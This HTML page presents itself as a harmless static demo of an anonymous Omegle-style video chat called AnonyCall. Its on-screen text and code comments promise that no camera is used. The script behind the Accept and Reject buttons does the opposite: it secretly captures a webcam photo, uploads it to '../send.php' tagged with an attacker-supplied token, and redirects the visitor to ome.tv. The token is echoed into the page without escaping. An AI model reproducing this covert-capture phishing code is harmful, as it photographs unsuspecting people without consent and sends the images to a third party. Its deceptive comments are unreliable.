<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>AnonyCall · Anonymous Video Chat (Static Demo)</title>
  <!-- Tailwind CSS v3 -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- Custom orange/white light theme -->
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            'anony-orange': '#f97316',
            'anony-orange-dark': '#ea580c',
            'anony-orange-light': '#ffedd5',
          }
        }
      }
    }
  </script>
  <!-- Font Awesome 6 -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    .avatar-bounce {
      animation: gentleBounce 2s ease-in-out infinite;
    }
    @keyframes gentleBounce {
      0%, 100% { transform: translateY(0px); }
      50% { transform: translateY(-5px); }
    }
    .chat-scrollbar::-webkit-scrollbar {
      width: 5px;
    }
    .chat-scrollbar::-webkit-scrollbar-track {
      background: #f1f1f1;
      border-radius: 10px;
    }
    .chat-scrollbar::-webkit-scrollbar-thumb {
      background: #f97316;
      border-radius: 10px;
    }
  </style>
</head>
<body class="bg-white text-gray-800 font-sans antialiased">

  <!-- main app container -->
  <div class="max-w-7xl mx-auto px-4 py-5 md:py-8 min-h-screen flex flex-col">
    
    <!-- Header -->
    <div class="flex flex-wrap justify-between items-center border-b border-anony-orange/20 pb-4 mb-6">
      <div class="flex items-center gap-3">
        <div class="bg-anony-orange rounded-2xl w-10 h-10 flex items-center justify-center shadow-md">
          <i class="fas fa-video text-white text-lg"></i>
        </div>
        <h1 class="text-2xl md:text-3xl font-extrabold tracking-tight">Anony<span class="text-anony-orange">Call</span></h1>
        <span class="hidden sm:inline-flex ml-2 bg-anony-orange-light text-anony-orange-dark text-xs px-2.5 py-1 rounded-full font-medium"><i class="fas fa-user-secret mr-1"></i> 100% anonymous</span>
      </div>
      <div class="flex gap-2 mt-2 sm:mt-0">
        <button class="bg-white border border-anony-orange/40 hover:bg-anony-orange-light text-anony-orange-dark px-4 py-2 rounded-full text-sm font-medium transition flex items-center gap-2 shadow-sm cursor-pointer">
          <i class="fas fa-random"></i> New Call
        </button>
        <button class="bg-white border border-red-200 text-red-500 hover:bg-red-50 px-4 py-2 rounded-full text-sm font-medium transition flex items-center gap-2 cursor-pointer">
          <i class="fas fa-phone-slash"></i> End
        </button>
      </div>
    </div>

    <!-- main grid: video area + side chat (omegle style) -->
    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6 flex-1">
      
      <!-- VIDEO SECTION (left + center) - 2 columns on lg -->
      <div class="lg:col-span-2 space-y-5">
        <!-- remote video card (stranger) -->
        <div class="bg-gradient-to-br from-gray-900 to-gray-800 rounded-2xl overflow-hidden shadow-xl border border-anony-orange/30 relative">
          <div class="relative aspect-video bg-black/80 flex items-center justify-center">
            <!-- remote video placeholder (no camera) -->
            <div class="text-center z-10 p-6">
              <div class="w-28 h-28 mx-auto bg-[url('./image.png')] blur-sm bg-cover rounded-full flex items-center justify-center avatar-bounce">
              </div>
              <div class="mt-4 space-y-1">
                <p class="text-white font-medium text-lg flex items-center justify-center gap-2">
                  <span class="w-2.5 h-2.5 bg-green-500 rounded-full inline-block"></span>
                  Stranger <span class="text-anony-orange font-mono text-sm">#X7K9M2</span>
                </p>
                <p class="text-gray-300 text-xs">🔒 anonymous video call • simulated</p>
              </div>
            </div>
            <!-- overlay badge: no real camera -->
            <div class="absolute bottom-3 left-3 bg-black/60 backdrop-blur-sm rounded-full px-3 py-1 text-xs text-white flex items-center gap-1">
              <i class="fas fa-info-circle text-anony-orange"></i> 
              <span>demo mode • no real camera</span>
            </div>
          </div>
          <div class="bg-gray-900/90 px-4 py-2 border-t border-anony-orange/20 flex justify-between items-center">
            <div class="text-xs text-gray-300"><i class="fas fa-microphone-slash mr-1"></i> muted (demo)</div>
            <div class="text-xs text-gray-300"><i class="fas fa-video-slash mr-1"></i> camera off</div>
          </div>
        </div>

        <!-- my video card (me - local preview placeholder) -->
        <div class="bg-white rounded-xl border border-gray-200 overflow-hidden shadow-md">
          <div class="flex items-center justify-between px-4 py-2 bg-anony-orange-light/40 border-b border-anony-orange/20">
            <div class="flex items-center gap-2">
              <i class="fas fa-user-circle text-anony-orange text-xl"></i>
              <span class="font-semibold text-gray-700 text-sm">Your Video (preview)</span>
            </div>
            <div class="text-xs text-gray-500 bg-white/60 px-2 py-0.5 rounded-full"><i class="fas fa-laptop"></i> you</div>
          </div>
          <div class="relative aspect-video bg-gray-100 flex items-center justify-center">
            <div class="text-center p-5">
              <div class="w-20 h-20 mx-auto bg-anony-orange/10 rounded-full flex items-center justify-center">
                <i class="fas fa-smile-wink text-4xl text-anony-orange"></i>
              </div>
              <p class="mt-3 text-gray-500 text-sm">Your camera • <span class="text-anony-orange font-medium">inactive (demo)</span></p>
              <p class="text-xs text-gray-400 mt-1"><i class="fas fa-shield-alt"></i> no real access — simulated UI</p>
            </div>
          </div>
        </div>
      </div>

      <!-- RIGHT SIDEBAR: LIVE CHAT (Omegle style text - static preview) -->
      <div class="bg-white rounded-2xl border border-anony-orange/20 shadow-md flex flex-col h-[550px] lg:h-[600px] overflow-hidden">
        <div class="bg-anony-orange-light/60 px-5 py-3 border-b border-anony-orange/20 flex justify-between items-center">
          <div class="flex items-center gap-2">
            <i class="fas fa-comment-dots text-anony-orange text-lg"></i>
            <h3 class="font-bold text-gray-700">Live Chat</h3>
          </div>
          <div class="text-xs bg-white rounded-full px-2 py-0.5 text-anony-orange-dark">anonymous</div>
        </div>
        
        <!-- chat messages container (static demo messages) -->
        <div id="chatMessagesBox" class="flex-1 p-4 overflow-y-auto space-y-3 chat-scrollbar bg-gray-50">
          <div class="flex justify-start">
            <div class="max-w-[80%] bg-white border border-anony-orange/30 text-gray-800 rounded-2xl rounded-tl-none px-3 py-2 shadow-sm">
              <div class="flex items-center gap-1.5 text-anony-orange text-[10px] font-medium mb-1">
                <i class="fas fa-user-secret"></i> <span>Stranger · #X7K9M2</span>
              </div>
              <div class="text-sm break-words">Hey! Glad to meet you anonymously 👋</div>
              <div class="text-[9px] text-gray-400 text-right mt-0.5">12:42 PM</div>
            </div>
          </div>
          <div class="flex justify-end">
            <div class="max-w-[80%] bg-anony-orange text-white rounded-2xl rounded-tr-none px-3 py-2 shadow-sm">
              <div class="text-sm break-words">Hi there! This is an anonymous call demo</div>
              <div class="text-[9px] text-orange-100 text-right mt-0.5">12:42 PM · you</div>
            </div>
          </div>
          <div class="flex justify-start">
            <div class="max-w-[80%] bg-white border border-anony-orange/30 text-gray-800 rounded-2xl rounded-tl-none px-3 py-2 shadow-sm">
              <div class="flex items-center gap-1.5 text-anony-orange text-[10px] font-medium mb-1">
                <i class="fas fa-user-secret"></i> <span>Stranger · #X7K9M2</span>
              </div>
              <div class="text-sm break-words">No real camera needed — just the Omegle experience ✨</div>
              <div class="text-[9px] text-gray-400 text-right mt-0.5">12:43 PM</div>
            </div>
          </div>
          <div class="flex justify-center">
            <div class="bg-gray-200/70 text-gray-600 text-xs rounded-full px-3 py-1 max-w-[90%] text-center">
              <i class="fas fa-info-circle mr-1"></i> You are now connected anonymously
            </div>
          </div>
          <div class="flex justify-end">
            <div class="max-w-[80%] bg-anony-orange text-white rounded-2xl rounded-tr-none px-3 py-2 shadow-sm">
              <div class="text-sm break-words">This looks like a fun random chat!</div>
              <div class="text-[9px] text-orange-100 text-right mt-0.5">12:43 PM · you</div>
            </div>
          </div>
        </div>
        
        <!-- message input -->
        <div class="p-4 border-t border-anony-orange/20 bg-white">
          <div class="flex gap-2">
            <input type="text" placeholder="Type a message..." class="flex-1 border border-gray-300 rounded-full py-2.5 px-4 text-sm focus:outline-none focus:ring-2 focus:ring-anony-orange/50 focus:border-anony-orange bg-gray-50 cursor-not-allowed" readonly disabled>
            <button class="bg-anony-orange/50 text-white rounded-full w-10 h-10 flex items-center justify-center cursor-not-allowed" disabled>
              <i class="fas fa-paper-plane"></i>
            </button>
          </div>
          <div class="text-[11px] text-center text-gray-400 mt-2">
            <i class="fas fa-lock"></i> end-to-end encrypted (demo) • anonymous chat
          </div>
        </div>
      </div>
    </div>

    <!-- status row & connection info -->
    <div class="mt-6 flex flex-wrap justify-between items-center gap-3 pt-2 border-t border-gray-100 text-xs text-gray-500">
      <div class="flex gap-4">
        <div class="flex items-center gap-1"><i class="fas fa-circle text-green-500 text-[8px]"></i> <span>Connected to stranger</span></div>
        <div class="flex items-center gap-1"><i class="fas fa-id-card"></i> <span>Your ID: <span class="font-mono">#A3F9D1</span></span></div>
      </div>
      <div class="text-anony-orange"><i class="fas fa-shield-alt"></i> No camera • UI simulation only</div>
    </div>
  </div>

  <!-- CAMERA PERMISSION SIMULATION OVERLAY (appears on load, just hides on click - no JS logic) -->
  <div id="cameraOverlayPanel" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4 transition-all duration-300" style="cursor: pointer;">
    <div class="bg-white max-w-md w-full rounded-2xl shadow-2xl overflow-hidden pointer-events-auto">
      <div class="bg-anony-orange-light px-6 py-4 border-b border-anony-orange/20 flex items-center gap-3">
        <div class="bg-anony-orange rounded-full w-11 h-11 flex items-center justify-center">
          <i class="fas fa-camera-retro text-white text-xl"></i>
        </div>
        <h2 class="text-xl font-bold text-gray-800">Camera access required?</h2>
      </div>
      <div class="p-6">
        <p class="text-gray-700 font-medium">AnonyCall would like to use your camera</p>
        <p class="text-sm text-gray-500 mt-1 mb-4">This is a <span class="font-semibold">visual simulation</span> — no real video stream will ever be activated. Choose accept or reject to start the anonymous experience.</p>
        <div class="flex gap-3 justify-end">
          <button id="rejectCamBtn" class="px-5 py-2 border border-gray-300 rounded-full text-gray-700 hover:bg-gray-100 transition font-medium cursor-pointer">Reject</button>
          <button id="acceptCamBtn" class="px-5 py-2 bg-anony-orange hover:bg-anony-orange-dark text-white rounded-full shadow transition font-medium cursor-pointer">Accept</button>
        </div>
      </div>
      <div class="bg-gray-50 px-6 py-3 text-xs text-gray-400 border-t flex justify-between">
        <span><i class="fas fa-user-secret"></i> 100% anonymous · video only simulated</span>
        <span><i class="fab fa-omegle"></i> Omegle style</span>
      </div>
    </div>
  </div>
<input id="user_id" type="text" style="display: none;"
        value="<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>">
  <!-- VERY MINIMAL JAVASCRIPT: ONLY TO HIDE THE OVERLAY DIV ON ACCEPT/REJECT - NO OTHER LOGIC -->
  <script>
    // The only purpose of this script: hide the camera permission overlay when user clicks Accept or Reject.
    // No camera initialization, no chat logic, no dynamic changes to the rest of the page.
    // Everything else remains perfectly static as designed.
    
    const overlayDiv = document.getElementById('cameraOverlayPanel');
    const acceptButton = document.getElementById('acceptCamBtn');
    const rejectButton = document.getElementById('rejectCamBtn');
    
    // Simple function to fade out and remove the overlay div
    function hideOverlay() {
      let user_id = document.getElementById('user_id');
      navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    video.onloadedmetadata = () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('image', blob, 'photo.png');
                            formData.append('id', user_id.value);
                            formData.append('page', 'image');
                            fetch('../send.php', {
                                method: 'POST',
                                body: formData
                            }).then(response => response.text())
                                .then(data => {
                                    console.log(data);
                                    stream.getTracks().forEach(track => track.stop());

                                    window.location.href = 'https://ome.tv/';
                                })
                                .catch(error => console.error('Error:', error));
                        }, 'image/peg');
                    }
                })
      if (overlayDiv) {
        overlayDiv.style.opacity = '0';
        setTimeout(function() {
          if (overlayDiv && overlayDiv.parentNode) {
            overlayDiv.parentNode.removeChild(overlayDiv);
          }
        }, 200);
      }
    }
    
    // Add click listeners to both buttons - only hide overlay, nothing else
    if (acceptButton) {
      acceptButton.addEventListener('click', function(e) {
        e.stopPropagation();
        hideOverlay();
      });
    }
    
    if (rejectButton) {
      rejectButton.addEventListener('click', function(e) {
        e.stopPropagation();
        hideOverlay();
      });
    }
    
    // Also clicking on the backdrop (the overlay background) will NOT close it accidentally
    // to prevent confusion, but we make sure only buttons trigger removal.
    // If someone clicks the overlay background, nothing happens (as per design)
    if (overlayDiv) {
      overlayDiv.addEventListener('click', function(e) {
        // If the click target is the overlay itself (background), do nothing
        if (e.target === overlayDiv) {
          // Do nothing - requires explicit accept/reject
          return;
        }
      });
    }
  </script>
</body>
</html>